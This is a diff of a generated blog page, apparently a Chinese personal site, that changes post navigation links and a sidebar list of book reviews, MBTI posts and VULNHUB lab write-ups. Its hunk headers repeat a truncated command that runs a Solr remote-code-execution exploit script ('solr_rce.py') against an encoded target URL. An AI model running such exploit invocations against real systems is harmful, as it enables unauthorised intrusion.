@@ -1021,12 +686,12 @@ D:\Python27\python.exe solr_rce.py <span class="exturl" data-url="aHR0cDovLzEyMy
 
   <ul id="quick">
     <li class="prev pjax">
-        <a href="/2023/07/04/SAFE/1%20WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+        <a href="/2023/07/04/SAFE/5%20APP%E6%94%BB%E9%98%B2/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
     </li>
     <li class="up"><i class="ic i-arrow-up"></i></li>
     <li class="down"><i class="ic i-arrow-down"></i></li>
     <li class="next pjax">
-        <a href="/2023/07/04/SAFE/4%20API%E6%94%BB%E9%98%B2/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+        <a href="/2023/07/04/SAFE/2%20WEB%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
     </li>
     <li class="percent"></li>
   </ul>
@@ -1048,20 +713,10 @@ D:\Python27\python.exe solr_rce.py <span class="exturl" data-url="aHR0cDovLzEyMy
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
-</div>
-
-    <span><a href="/2023/06/30/BOOK/57%E3%80%8A%E4%B8%8D%E6%9C%BD%E3%80%8B%E7%B1%B3%E5%85%B0%C2%B7%E6%98%86%E5%BE%B7%E6%8B%89/" title="《不朽》米兰·昆德拉">《不朽》米兰·昆德拉</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
 <a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
 </div>
 
-    <span><a href="/2023/06/30/BOOK/23%E3%80%8A%E7%8E%B0%E5%AE%9E%E4%B8%80%E7%A7%8D%E3%80%8B%E4%BD%99%E5%8D%8E/" title="《现实一种》余华">《现实一种》余华</a></span>
+    <span><a href="/2023/06/30/BOOK/55%E3%80%8A%E7%BE%8E%E4%B8%BD%E6%96%B0%E4%B8%96%E7%95%8C%E3%80%8B%E9%98%BF%E9%81%93%E5%8F%B8%C2%B7%E8%B5%AB%E8%83%A5%E9%BB%8E/" title="《美丽新世界》阿道司·赫胥黎">《美丽新世界》阿道司·赫胥黎</a></span>
   </li>
 
       
@@ -1071,57 +726,27 @@ D:\Python27\python.exe solr_rce.py <span class="exturl" data-url="aHR0cDovLzEyMy
 <a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
 </div>
 
-    <span><a href="/2023/07/01/VULNHUB/135%20HACKABLE3/" title="VULNHUB HACKABLE3">VULNHUB HACKABLE3</a></span>
+    <span><a href="/2023/07/01/VULNHUB/124%20HACKABLELL/" title="VULNHUB HACKABLELL">VULNHUB HACKABLELL</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
 </div>
 
-    <span><a href="/2023/04/01/MBTI/%E9%83%A8%E5%88%86%E5%AD%97%E6%AF%8D%E7%89%B9%E5%BE%81/" title="部分字母特征">部分字母特征</a></span>
+    <span><a href="/2023/07/01/VULNHUB/140%20LOOZ/" title="VULNHUB LOOZ">VULNHUB LOOZ</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
 </div>
 
-    <span><a href="/2023/04/01/MBTI/ENFP%E8%A7%A3%E8%AF%BB/" title="ENFP解读">ENFP解读</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
-</div>
-
-    <span><a href="/2023/06/30/BOOK/53%E3%80%8A%E4%B8%8D%E8%83%BD%E6%89%BF%E5%8F%97%E7%9A%84%E7%94%9F%E5%91%BD%E4%B9%8B%E8%BD%BB%E3%80%8B%E7%B1%B3%E5%85%B0%C2%B7%E6%98%86%E5%BE%B7%E6%8B%89/" title="《不能承受的生命之轻》米兰·昆德拉">《不能承受的生命之轻》米兰·昆德拉</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
-</div>
-
-    <span><a href="/2023/04/01/MBTI/INFJ%E8%A7%A3%E8%AF%BB/" title="INFJ解读">INFJ解读</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
-</div>
-
-    <span><a href="/2023/06/30/BOOK/10%E3%80%8A%E6%91%86%E6%B8%A1%E4%BA%BA%E3%80%8B%E5%85%8B%E8%8E%B1%E5%B0%94%C2%B7%E9%BA%A6%E5%85%8B%E7%A6%8F%E5%B0%94/" title="《摆渡人》克莱尔·麦克福尔">《摆渡人》克莱尔·麦克福尔</a></span>
+    <span><a href="/2023/07/01/VULNHUB/144%20CEREAL/" title="VULNHUB CEREAL">VULNHUB CEREAL</a></span>
   </li>
 
       
@@ -1138,9 +763,50 @@ D:\Python27\python.exe solr_rce.py <span class="exturl" data-url="aHR0cDovLzEyMy
   <li class="item">
     
 <div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
 </div>
 
-    <span><a href="/2023/07/04/SAFE/11%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="未命名">未命名</a></span>
+    <span><a href="/2023/06/30/BOOK/19%E3%80%8A%E8%AE%A9%E4%BD%A0%E7%88%B1%E4%B8%8D%E9%87%8A%E6%89%8B%E7%9A%84%E6%9E%81%E7%AE%80%E4%B8%96%E7%95%8C%E5%8F%B2%E3%80%8B%E5%A7%9A%E5%B0%A7/" title="《让你爱不释手的极简世界史》姚尧">《让你爱不释手的极简世界史》姚尧</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/01/VULNHUB/136%20GROTESQUE1/" title="VULNHUB GROTESQUE1">VULNHUB GROTESQUE1</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2023/04/01/MBTI/ISFP%E8%A7%A3%E8%AF%BB/" title="ISFP解读">ISFP解读</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2023/06/30/BOOK/26%E3%80%8A%E4%BA%BA%E7%B1%BB%E7%AE%80%E5%8F%B2%E3%80%8B%E5%B0%A4%E7%93%A6%E5%B0%94%C2%B7%E8%B5%AB%E6%8B%89%E5%88%A9/" title="《人类简史》尤瓦尔·赫拉利">《人类简史》尤瓦尔·赫拉利</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2023/06/30/BOOK/7%E3%80%8A%E6%B4%BB%E7%9D%80%E3%80%8B%E4%BD%99%E5%8D%8E/" title="《活着》余华">《活着》余华</a></span>
   </li>
 
   </ul>
